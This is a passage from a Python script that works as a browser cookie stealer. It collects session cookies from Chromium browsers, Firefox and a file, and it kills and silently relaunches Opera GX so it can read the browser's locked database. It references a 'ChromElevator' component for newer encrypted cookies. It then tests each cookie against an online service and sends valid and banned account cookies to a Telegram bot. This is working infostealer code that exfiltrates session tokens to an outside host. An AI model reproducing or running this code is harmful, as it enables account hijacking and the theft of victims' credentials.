    all_cookies.extend(c)
    print(f"  -> {len(c)} cookie(s) found\n")

    # Direct extraction for v10/v11 (older browser versions, skips v20)
    # ChromElevator browsers are skipped here — already handled above

    # Browsers that lock their DB exclusively — must be closed to read
    EXCLUSIVE_LOCK_BROWSERS = {
        "OperaGX": "opera.exe",
    }

    for name, user_data_dir in BROWSER_PROFILES.items():
        if name in CHROMELEVATOR_BROWSERS:
            continue  # handled by ChromElevator
        print(f"[~] Checking {name}...")

        proc_name = EXCLUSIVE_LOCK_BROWSERS.get(name)
        exe_path  = None
        was_running = False

        if proc_name:
            import subprocess as _sub
            # Check if running
            _chk = _sub.run(
                ["wmic", "process", "where", f"name='{proc_name}'", "get", "ExecutablePath"],
                capture_output=True, creationflags=0x08000000
            )
            lines = [l.strip() for l in _chk.stdout.decode(errors='ignore').splitlines() if l.strip() and l.strip() != 'ExecutablePath']
            if lines:
                exe_path    = lines[0] if os.path.exists(lines[0]) else None
                was_running = True
                print(f"  [{name}] Browser open — closing briefly to read cookies...")
                _sub.run(["taskkill", "/F", "/IM", proc_name], capture_output=True, creationflags=0x08000000)
                import time; time.sleep(1.5)

        c = extract_from_chromium_browser(name, user_data_dir)
        all_cookies.extend(c)

        if was_running and exe_path:
            print(f"  [{name}] Relaunching (tabs restore automatically)...")
            import subprocess as _sub2
            _sub2.Popen([exe_path], creationflags=0x08000000)

        print(f"  -> {len(c)} cookie(s) found\n")

    print("[~] Checking Firefox...")
    c = extract_from_firefox()
    all_cookies.extend(c)
    print(f"  -> {len(c)} cookie(s) found\n")

    print(f"[~] Checking {COOKIES_FILE}...")
    c = load_cookies_from_file(COOKIES_FILE)
    all_cookies.extend(c)
    print(f"  -> {len(c)} cookie(s) found\n")

    all_cookies = list(dict.fromkeys(all_cookies))

    if not all_cookies:
        print("[!] No cookies found anywhere.")
        return

    proxies = load_proxies(PROXY_FILE) if PROXY_FILE else []
    total   = len(all_cookies)
    print(f"[~] {total} unique cookie(s) found. Starting check...\n")
    print("-" * 62)

    counters   = {"valid": 0, "invalid": 0, "banned": 0, "error": 0}
    tg_results = {"valid": [], "banned": []}
    all_results = {"valid": [], "invalid": [], "banned": [], "error": []}
    semaphore  = asyncio.Semaphore(THREADS)
    lock       = asyncio.Lock()

    async def worker(cookie: str, idx: int):
        async with semaphore:
            r = await check_cookie(cookie, proxies, TIMEOUT_SEC)
            async with lock:
                s = r["status"]
                counters[s] = counters.get(s, 0) + 1
                if s == "valid":
                    tg_results["valid"].append(r)
                    all_results["valid"].append(r)
                    print(f"{console_summary(r)}  ({idx}/{total})")
                elif s == "banned":
                    tg_results["banned"].append(r["cookie"])
                    all_results["banned"].append(r["cookie"])
                    print(f"  [!] BANNED   ({idx}/{total})")
                elif s == "invalid":
                    all_results["invalid"].append(r["cookie"])
                    print(f"  [-] INVALID  ({idx}/{total})")
                else:
                    err = r.get("error", r.get("code", "?"))
                    all_results["error"].append(f"{r['cookie']} | {err}")
                    print(f"  [?] ERROR    | {err}  ({idx}/{total})")

    await asyncio.gather(*(worker(c, i + 1) for i, c in enumerate(all_cookies)))

    # -- Send to Telegram -----------------------------------------------------
    print("[~] Sending results to Telegram...")
    async with ClientSession() as tg:

        for r in tg_results["valid"]:
            await send_telegram(tg, format_telegram(r))

        for cookie in tg_results["banned"]:
            await send_telegram(tg, f"<b>Banned Account</b>\n\n<code>{cookie}</code>")

        await send_telegram(tg, (
            f"<b>Scan Complete</b>\n\n"
            f"Valid   : {counters['valid']}\n"
            f"Banned  : {counters['banned']}\n"
            f"Invalid : {counters['invalid']}\n"
            f"Errors  : {counters['error']}\n"
            f"Total   : {total}"
        ))

    write_log(f"Done | valid={counters['valid']} banned={counters['banned']} invalid={counters['invalid']} errors={counters.get('error',0)} total={total}")
    print(f"\n-- Results ------------------------------------------")
    print(f"  Valid   : {counters['valid']}")
    print(f"  Invalid : {counters['invalid']}")
    print(f"  Banned  : {counters['banned']}")
    print(f"  Errors  : {counters.get('error', 0)}")
    print("-----------------------------------------------------")


if __name__ == "__main__":
    import sys
    is_compiled = getattr(sys, "frozen", False) or "__compiled__" in dir()
    write_log(f"Launched from: {os.path.abspath(sys.argv[0])} | compiled={is_compiled}")
    asyncio.run(main())